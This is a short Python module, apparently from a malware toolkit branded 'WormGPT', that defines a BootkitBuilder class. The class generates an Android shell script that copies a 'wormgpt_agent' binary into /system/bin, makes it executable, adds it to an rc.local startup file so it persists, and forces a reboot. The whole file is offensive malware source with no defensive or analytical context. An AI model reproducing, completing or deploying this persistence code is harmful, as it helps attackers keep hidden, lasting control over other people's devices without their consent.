import os
import shutil
from core.config_manager import ConfigManager

class BootkitBuilder:
    def __init__(self, config_manager: ConfigManager):
        self.config = config_manager

    def generate_bootkit(self, session_id: str):
        """Generates a script to be added to the init process."""
        script_name = f"wormgpt_boot_{session_id[:8]}.sh"
        
        # Logic to copy agent to /system/bin or /data/local/tmp
        boot_script = f"""
#!/system/bin/sh
# WormGPT Bootkit Persistence Script

if [ -f "/system/bin/wormgpt_agent" ]; then
    exit 0
fi

# Copy agent binary
cp /data/local/tmp/wormgpt_agent /system/bin/wormgpt_agent
chmod 755 /system/bin/wormgpt_agent

# Add to init.d or rc.local
echo "/system/bin/wormgpt_agent" >> /data/local/tmp/rc.local

# Reboot
reboot
"""
        
        with open(f"persistence/{script_name}", "w") as f:
            f.write(boot_script)
            
        print(f"Generated Bootkit Script: persistence/{script_name}")